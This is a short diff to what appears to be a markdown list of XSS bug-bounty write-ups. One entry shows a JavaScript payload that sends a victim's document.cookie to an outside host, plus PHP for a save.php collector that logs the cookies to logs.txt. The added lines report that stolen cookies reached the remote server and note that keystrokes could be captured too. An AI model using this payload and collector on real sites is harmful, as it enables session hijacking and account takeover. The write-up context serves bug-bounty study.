@@ -42,7 +42,7 @@
 
     document.location='https://ł.rip/save.php?c='+document.cookie;
 
-3. source code of save.php file is given below which would save the cookie into a text file
+3.source code of save.php file is given below which would save the cookie into a text file
 
 >     <?php
 >     header('Location:https://yourdomain.com');
@@ -51,7 +51,13 @@
 >     fwrite($file, $cookies . "\n\n");
 >     ?>
      
- 4.
+4.The cookies will be saved in logs.txt file in the remote server, we can capture mouse movement, keystrokes as well
+
+5.And then I confirmed the working of the script by executing at my own end and here we go. Biscuits coming to our remote server
+
+6.Now opening logs.txt, just to confirm the cookies.
+
+7.the XSS never got executed in the shop admin dashboard/backend
 
 
 - [Reflected XSS  in AT&T](https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7)
